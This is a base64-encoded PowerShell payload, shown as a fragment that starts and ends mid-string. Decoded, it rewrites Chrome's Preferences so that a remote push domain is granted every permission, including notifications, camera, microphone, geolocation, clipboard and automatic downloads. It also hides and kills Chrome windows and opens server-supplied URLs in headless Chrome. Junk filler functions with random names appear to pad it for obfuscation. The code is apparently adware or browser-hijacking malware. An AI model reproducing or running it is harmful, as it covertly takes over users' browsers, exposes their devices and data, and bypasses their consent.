lwYm9hcmQiLCAiY29va2llcyIsIA0KICAgICAgICAgICAgImdlb2xvY2F0aW9uIiwgImltYWdlcyIsICJqYXZhc2NyaXB0IiwgIm1pY3JvcGhvbmUiLCAibWlkaV9zeXNleCIsIA0KICAgICAgICAgICAgIm5vdGlmaWNhdGlvbnMiLCAicG9wdXBzIiwgInBsdWdpbnMiLCAic291bmQiLCAidW5zYW5kYm94ZWRfcGx1Z2lucyIsIA0KICAgICAgICAgICAgImF1dG9tYXRpY19kb3dubG9hZHMiLCAiZmxhc2hfZGF0YSIsICJtaXhlZF9zY3JpcHQiLCAic2Vuc29ycyIsIndpbmRvd19wbGFjZW1lbnQiLCJ3ZWJpZF9hcGkiLCJ2ciIsDQogICAgICAgICAgICAic3VicmVzb3VyY2VfZmlsdGVyIiwibWVkaWFfc3RyZWFtX21pYyIsIm1lZGlhX3N0cmVhbV9taWMiLCJtZWRpYV9zdHJlYW1fY2FtZXJhIiwibG9jYWxfZm9udHMiLA0KICAgICAgICAgICAgImphdmFzY3JpcHRfaml0IiwiaWRsZV9kZXRlY3Rpb24iLCJjYXB0dXJlZF9zdXJmYWNlX2NvbnRyb2wiLCJhciINCg0KICAgICAgICApDQoNCiAgICAgICAgZm9yZWFjaCAoJHNldHRpbmcgaW4gJHNldHRpbmdzVG9VcGRhdGUpIHsNCiAgICAgICAgICAgIGlmICgkbnVsbCAtZXEgJGNvbnRlbnRTZXR0aW5ncy4kc2V0dGluZykgew0KICAgICAgICAgICAgICAgICRjb250ZW50U2V0dGluZ3MgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAkc2V0dGluZyAtVmFsdWUgQHt9DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkc3BlY2lmaWNTZXR0aW5nID0gJGNvbnRlbnRTZXR0aW5ncy4kc2V0dGluZw0KICAgICAgICAgICAgaWYgKCRzcGVjaWZpY1NldHRpbmcuUFNPYmplY3QuUHJvcGVydGllcy5OYW1lIC1jb250YWlucyAkcHVzaERvbWFpbikgeyAgICAgICAgICAgIA0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkc3BlY2lmaWNTZXR0aW5nIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJHB1c2hEb21haW4gLVZhbHVlIEB7DQogICAgICAgICAgICAgICAgICAgICJsYXN0X21vZGlmaWVkIiA9ICIxMzM2MjcyMDU0NTc4NTc3NCINCiAgICAgICAgICAgICAgICAgICAgInNldHRpbmciID0gMQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkY29udGVudFNldHRpbmdzLiRzZXR0aW5nID0gJHNwZWNpZmljU2V0dGluZw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucyA9ICRjb250ZW50U2V0dGluZ3MNCiAgICAgICAgJHVwZGF0ZWRQcmVmZXJlbmNlc0pzb24gPSAkcHJlZmVyZW5jZXNDb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQogICAgICAgICR1cGRhdGVkUHJlZmVyZW5jZXNKc29uIHwgU2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtRW5jb2RpbmcgVVRGOA0KDQogICAgICAgIFdyaXRlLU91dHB1dCAiTm90aWZpY2F0aW9uIHN1YnNjcmlwdGlvbiBmb3IgJHB1c2hEb21haW4gYWRkZWQgc3VjY2Vzc2Z1bGx5IHdpdGggYWxsIHBlcm1pc3Npb25zLiINCiAgICB9IGVsc2Ugew0KICAgICAgICBXcml0ZS1PdXRwdXQgIlByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRwcmVmZXJlbmNlc1BhdGgiDQogICAgfQ0KfQ0KDQoNCg0KZnVuY3Rpb24gQ2xvc2UtQ2hyb21lV2luZG93IHsNCiAgICBwYXJhbSAoJHdpbmRvdykNCiAgICBbVXNlcjMyWF06OkNsb3NlV2luZG93KCR3aW5kb3cpIHwgT3V0LU51bGwNCiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDI1DQp9DQoNCmZ1bmN0aW9uIENsb3NlLUNocm9tZSB7DQogICAgcGFyYW0gKCRwcm9jZXNzKQ0KICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUNCiAgICB0cnkgew0KICAgICAgICAkcHJvY2Vzcy5DbG9zZSgpDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIENsb3NlLUFsbENocm9tZXMgew0KICAgICR3aW5kb3dzID0gW1VzZXIzMlhdOjpFbnVtZXJhdGVBbGxXaW5kb3dzKCkNCiAgICBmb3JlYWNoICgkd2luZG93IGluICR3aW5kb3dzKSANCiAgICB7DQogICAgICAgICR0aXRsZSA9IFtVc2VyMzJYXTo6R2V0V2luZG93VGV4dCgkd2luZG93KQ0KICAgICAgICBpZiAoJHRpdGxlLkNvbnRhaW5zKCJHb29nbGUgQ2hyb21lIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIFtVc2VyMzJYXTo6U2hvd1dpbmRvdygkd2luZG93LCBbVXNlcjMyWF06OlNXX0hJREUpIHwgT3V0LU51bGwNCiAgICAgICAgICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICR3aW5kb3cNCiAgICAgICAgfQ0KICAgIH0NCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnY2hyb21lLmV4ZScpKQ0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVDaHJvbWVQdXNoZXMgew0KDQogICAgdHJ5IHsNCiAgICAgICAgDQogICANCg0KICAgIEFkZC1UeXBlIEAiDQogICAgdXNpbmcgU3lzdGVtOw0KICAgIHVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOw0KICAgIHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCiAgICB1c2luZyBTeXN0ZW0uVGV4dDsNCg0KICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgVXNlcjMyWCB7DQogICAgICAgIHB1YmxpYyBkZWxlZ2F0ZSBib29sIEVudW1XaW5kb3dzUHJvYyhJbnRQdHIgaFduZCwgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBFbnVtV2luZG93cyhFbnVtV2luZG93c1Byb2MgbHBFbnVtRnVuYywgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQsIFN0cmluZ0J1aWxkZXIgbHBTdHJpbmcsIGludCBuTWF4Q291bnQpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0TGVuZ3RoKEludFB0ciBoV25kKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIElzV2luZG93VmlzaWJsZShJbnRQdHIgaFduZCk7DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgaW50IGxlbmd0aCA9IEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCk7DQogICAgICAgICAgICBpZiAobGVuZ3RoID09IDApIHJldHVybiBTdHJpbmcuRW1wdHk7DQoNCiAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcihsZW5ndGggKyAxKTsNCiAgICAgICAgICAgIEdldFdpbmRvd1RleHQoaFduZCwgc2IsIHNiLkNhcGFjaXR5KTsNCiAgICAgICAgICAgIHJldHVybiBzYi5Ub1N0cmluZygpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIElzV2luZG93VmlzaWJsZUV4KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICByZXR1cm4gSXNXaW5kb3dWaXNpYmxlKGhXbmQpICYmIEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCkgPiAwOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBJbnRQdHJbXSBFbnVtZXJhdGVBbGxXaW5kb3dzKCkgew0KICAgICAgICAgICAgdmFyIHdpbmRvd0hhbmRsZXMgPSBuZXcgTGlzdDxJbnRQdHI+KCk7DQogICAgICAgICAgICBFbnVtV2luZG93cygoaFduZCwgbFBhcmFtKSA9PiB7DQogICAgICAgICAgICAgICAgaWYgKElzV2luZG93VmlzaWJsZUV4KGhXbmQpKSB7DQogICAgICAgICAgICAgICAgICAgIHdpbmRvd0hhbmRsZXMuQWRkKGhXbmQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0sIEludFB0ci5aZXJvKTsNCiAgICAgICAgICAgIHJldHVybiB3aW5kb3dIYW5kbGVzLlRvQXJyYXkoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0KDQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfSElERSA9IDA7DQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfTUlOSU1JWkUgPSA2Ow0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX1NIT1cgPSA1Ow0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBQb3N0TWVzc2FnZShJbnRQdHIgaFduZCwgdWludCBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0pOw0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBDbG9zZVdpbmRvdyhJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgY29uc3QgdWludCBXTV9DTE9TRSA9IDB4MDAxMDsNCiAgICAgICAgICAgIFBvc3RNZXNzYWdlKGhXbmQsIFdNX0NMT1NFLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOw0KICAgICAgICB9DQogICAgfQ0KIkANCg0KICAgIGlmIChIYXZlVG9QdXNoZXMpDQogICAgew0KICAgICAgICBDbG9zZS1BbGxDaHJvbWVzOw0KICAgICAgICBSZW1vdmUtUHVzaGVzOw0KICAgICAgICBBZGQtUHVzaGVzOw0KICAgIH0NCg0KfQ0KY2F0Y2ggew0KICAgIFdyaXRlLUVycm9yICJBbiBlcnJvciBvY2N1cnJlZCAoQ29uZmlndXJlIENocm9tZSBQdXNoZXMpOiAkXyINCn0NCn0NCg0KDQoNCmZ1bmN0aW9uIE9wZW4tQ2hyb21lV2l0aFVybCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmwsICRpc0RlYnVnDQogICAgKQ0KICAgICRqb2IgPSBTdGFydC1Kb2IgLVNjcmlwdEJsb2NrIHsNCiAgICAgICAgICAgIHBhcmFtICgkdXJsLCAkaXNEZWJ1ZykNCg0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICANCiANCiAgICAgICAgICAgIEFkZC1UeXBlIEAiDQogICAgICAgICAgICB1c2luZyBTeXN0ZW07DQogICAgICAgICAgICB1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsNCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5UZXh0Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGNsYXNzIFVzZXIzMlggew0KICAgICAgICAgICAgICAgIHB1YmxpYyBkZWxlZ2F0ZSBib29sIEVudW1XaW5kb3dzUHJvYyhJbnRQdHIgaFduZCwgSW50UHRyIGxQYXJhbSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bVdpbmRvd3MoRW51bVdpbmRvd3NQcm9jIGxwRW51bUZ1bmMsIEludFB0ciBsUGFyYW0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCwgU3RyaW5nQnVpbGRlciBscFN0cmluZywgaW50IG5NYXhDb3VudCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0TGVuZ3RoKEludFB0ciBoV25kKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBJc1dpbmRvd1Zpc2libGUoSW50UHRyIGhXbmQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgICAgICAgICBpbnQgbGVuZ3RoID0gR2V0V2luZG93VGV4dExlbmd0aChoV25kKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGxlbmd0aCA9PSAwKSByZXR1cm4gU3RyaW5nLkVtcHR5Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcihsZW5ndGggKyAxKTsNCiAgICAgICAgICAgICAgICAgICAgR2V0V2luZG93VGV4dChoV25kLCBzYiwgc2IuQ2FwYWNpdHkpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gc2IuVG9TdHJpbmcoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgSXNXaW5kb3dWaXNpYmxlRXgoSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIElzV2luZG93VmlzaWJsZShoV25kKSAmJiBHZXRXaW5kb3dUZXh0TGVuZ3RoKGhXbmQpID4gMDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIEludFB0cltdIEVudW1lcmF0ZUFsbFdpbmRvd3MoKSB7DQogICAgICAgICAgICAgICAgICAgIHZhciB3aW5kb3dIYW5kbGVzID0gbmV3IExpc3Q8SW50UHRyPigpOw0KICAgICAgICAgICAgICAgICAgICBFbnVtV2luZG93cygoaFduZCwgbFBhcmFtKSA9PiB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSXNXaW5kb3dWaXNpYmxlRXgoaFduZCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3dIYW5kbGVzLkFkZChoV25kKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB9LCBJbnRQdHIuWmVybyk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiB3aW5kb3dIYW5kbGVzLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19ISURFID0gMDsNCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX01JTklNSVpFID0gNjsNCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX1NIT1cgPSA1Ow0KICAgICAgICAgICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfTUFYSU1JWkUgPSAzOyAvLyBBZGRlZCBjb25zdGFudCBmb3IgbWF4aW1pemluZyB3aW5kb3cNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFBvc3RNZXNzYWdlKEludFB0ciBoV25kLCB1aW50IE1zZywgSW50UHRyIHdQYXJhbSwgSW50UHRyIGxQYXJhbSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgQ2xvc2VXaW5kb3coSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgdWludCBXTV9DTE9TRSA9IDB4MDAxMDsNCiAgICAgICAgICAgICAgICAgICAgUG9zdE1lc3NhZ2UoaFduZCwgV01fQ0xPU0UsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KIkANCn0NCmNhdGNoIHsNCn0NCiAgICAgICAgDQogICAgICAgIGZ1bmN0aW9uIENsb3NlLUNocm9tZVdpbmRvdyB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIHBhcmFtICgkd2luZG93KQ0KICAgICAgICAgICAgICAgIFtVc2VyMzJYXTo6Q2xvc2VXaW5kb3coJHdpbmRvdykgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAwDQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCB7fQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBmdW5jdGlvbiBDbG9zZS1DaHJvbWUgew0KICAgICAgICAgICAgcGFyYW0gKCRwcm9jZXNzKQ0KICAgICAgICAgICAgQ2xvc2UtQ2hyb21lV2luZG93IC13aW5kb3cgJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZQ0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkcHJvY2VzcyB8IFN0b3AtUHJvY2VzcyAtRm9yY2UNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgICRjaHJvbWVQYXRocyA9IEAoDQogICAgICAgICAgICAiQzpcUHJvZ3JhbSBGaWxlc1xHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgICAgICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIiRlbnY6UHJvZ3JhbUZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICAgICAiJGVudjpQcm9ncmFtRmlsZXMoeDg2KVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiDQogICAgICAgICkNCiAgICAgICAgJHJlc29sdmVkUGF0aHMgPSBAKCkNCiAgICAgICAgZm9yZWFjaCAoJHBhdGggaW4gJGNocm9tZVBhdGhzKSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICRyZXNvbHZlZFBhdGggPSBSZXNvbHZlLVBhdGggLVBhdGggJHBhdGggLUVycm9yQWN0aW9uIFN0b3ANCiAgICAgICAgICAgICAgICBpZiAoJHJlc29sdmVkUGF0aCAtbm90aW4gJHJlc29sdmVkUGF0aHMpIHsNCiAgICAgICAgICAgICAgICAgICAgJHJlc29sdmVkUGF0aHMgKz0gJHJlc29sdmVkUGF0aC5QYXRoDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJFcnJvciByZXNvbHZpbmcgcGF0aDogJF8iDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHJlc29sdmVkUGF0aHMgPSAkcmVzb2x2ZWRQYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZQ0KICAgICAgICBmb3JlYWNoICgkcGF0aCBpbiAkcmVzb2x2ZWRQYXRocykgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCkgew0KICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiRm91bmQgQ2hyb21lIGF0OiAkcGF0aCINCiAgICANCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5GaWxlTmFtZSA9ICRwYXRoDQogICAgICAgICAgICAgICAgaWYgKC1ub3QgJGlzRGVidWcpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5Bcmd1bWVudHMgPSAiLS1oZWFkbGVzcyI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkFyZ3VtZW50cyArPSAiIC0tZGlzYWJsZS1ncHUgLS1kdW1wLWRvbSAkdXJsIg0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkNyZWF0ZU5vV2luZG93ID0gJGZhbHNlDQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlDQogICAgICAgICAgICAgICAgJHByb2Nlc3MgPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzDQogICAgICAgICAgICAgICAgJHByb2Nlc3MuU3RhcnRJbmZvID0gJHByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgICAgICAgICAkcHJvY2Vzcy5TdGFydCgpIHwgT3V0LU51bGwgICAgICAgICANCiAgICAgICAgICAgICAgICAkZW5kVGltZSA9IChHZXQtRGF0ZSkuQWRkU2Vjb25kcyg4KQ0KICAgICAgICAgICAgICAgIHdoaWxlICgoR2V0LURhdGUpIC1sdCAkZW5kVGltZSkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJGlzRGVidWcgLWVxICRmYWxzZSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgIyB0cnkNCiAgICAgICAgICAgICAgICAgICAgICAgICMgew0KICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgW1VzZXIzMlhdOjpTaG93V2luZG93KCRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUsIFtVc2VyMzJYXTo6U1dfSElERSkgfCBPdXQtTnVsbCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAjIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICMgY2F0Y2gNCiAgICAgICAgICAgICAgICAgICAgICAgICMgew0KICAgICAgICAgICAgICAgICAgICAgICAgIyB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAxMDANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgIyB0cnkNCiAgICAgICAgICAgICAgICAjIHsNCiAgICAgICAgICAgICAgICAjICAgICBbVXNlcjMyWF06OlNob3dXaW5kb3coJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZSwgW1VzZXIzMlhdOjpTV19TSE9XKSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgIyB9DQogICAgICAgICAgICAgICAgIyBjYXRjaA0KICAgICAgICAgICAgICAgICMgew0KICAgICAgICAgICAgICAgICMgfQ0KICAgICAgICAgICAgICAgIENsb3NlLUNocm9tZSAtcHJvY2VzcyAkcHJvY2Vzcw0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiQ2hyb21lIG5vdCBmb3VuZCBhdDogJHBhdGgiDQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgIH0gLUFyZ3VtZW50TGlzdCAkdXJsLCAkaXNEZWJ1Zw0KDQogICAgcmV0dXJuICRqb2INCn0NCg0KZnVuY3Rpb24gTGF1bmNoQ2hyb21lUHVzaGVzIHsNCiAgICB0cnkgew0KICAgICAgICBmb3JlYWNoICgkcHVzaCBpbiAkc2VydmVyLnB1c2hlcykgew0KICAgICAgICAgICAgJGlzRGVidWcgPSBJc0RlYnVnDQogICAgICAgICAgICBPcGVuLUNocm9tZVdpdGhVcmwgLXVybCAkcHVzaCAtaXNEZWJ1ZyAkaXNEZWJ1Zw0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgIFdyaXRlLUVycm9yICJBbiBlcnJvciBvY2N1cnJlZCBMYXVuY2hDaHJvbWVQdXNoZXMpOiAkXyINCiAgICB9DQp9DQpmdW5jdGlvbiBmbl9Mb2dfNWV6bjEybWwgewogICAgcGFyYW0gKAogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UKICAgICkKICAgIFdyaXRlLU91dHB1dCAnTG9nOiAkbWVzc2FnZScKfQpmdW5jdGlvbiBmbl9yVG90MWZnbSB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyXzNoNHBMbHI3LAogICAgICAgIFtpbnRdJHZhcl9nekhYQTJmVAogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfM2g0cExscjcgKyAkdmFyX2d6SFhBMmZUCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX1ZZQ2N5TERVIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfZ3pIWEEyZlQsCiAgICAgICAgW2ludF0kdmFyX1NSbERreEFqCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9nekhYQTJmVCArICR2YXJfU1JsRGt4QWoKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fYzRFT1ZkQ2UgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9TUmxEa3hBaiwKICAgICAgICBbaW50XSR2YXJfWGNVZmJxSXoKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX1NSbERreEFqICsgJHZhcl9YY1VmYnFJegogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9wbmVkRjBOOCB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX1hjVWZicUl6LAogICAgICAgIFtpbnRdJHZhcl9HSWNON09RaQogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfWGNVZmJxSXogKyAkdmFyX0dJY043T1FpCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX25ZbTdzaUhaIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfR0ljTjdPUWksCiAgICAgICAgW2ludF0kdmFyXzNoNHBMbHI3CiAgICApCiAgICAkcmVzdWx0I